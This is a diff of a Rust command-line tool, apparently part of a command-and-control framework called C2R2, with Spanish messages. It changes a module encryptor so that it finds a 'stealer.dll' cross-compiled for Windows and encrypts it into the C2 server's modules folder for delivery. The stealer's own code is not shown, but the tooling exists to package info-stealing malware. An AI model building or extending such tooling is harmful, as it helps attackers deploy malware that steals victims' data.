@@ -55,19 +55,33 @@ fn main() {
         }
         
         Commands::EncryptModule => {
-            println!("� C2R2 Module Encryptor v2.0");
+            println!("🔧 C2R2 Module Encryptor v2.0");
             println!("📦 Módulo: stealer");
             println!("{}", "-".repeat(50));
             
-            let dll_path = Path::new("../target/release/stealer.dll");
+            // Buscar DLL en target de Windows (cross-compilation desde Linux)
+            let dll_path_win = Path::new("../target/x86_64-pc-windows-gnu/release/stealer.dll");
+            let dll_path_native = Path::new("../target/release/stealer.dll");
+            
+            let dll_path = if dll_path_win.exists() {
+                dll_path_win
+            } else if dll_path_native.exists() {
+                dll_path_native
+            } else {
+                eprintln!("❌ Error: No se encontró stealer.dll");
+                eprintln!("   Ejecuta primero:");
+                eprintln!("   cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll");
+                eprintln!();
+                eprintln!("   Rutas buscadas:");
+                eprintln!("   - {}", dll_path_win.display());
+                eprintln!("   - {}", dll_path_native.display());
+                std::process::exit(1);
+            };
+            
+            println!("📂 DLL encontrada: {}", dll_path.display());
+            
             let output_enc = Path::new("../c2r2-server/modules/stealer.enc");
             let output_key = Path::new("../c2r2-server/modules/stealer.key");
-            
-            if !dll_path.exists() {
-                eprintln!("❌ Error: No se encontró stealer.dll");
-                eprintln!("   Ejecuta primero: cargo build --release --package stealer-dll");
-                std::process::exit(1);
-            }
             
             // Crear directorio modules si no existe
             if let Some(parent) = output_enc.parent() {
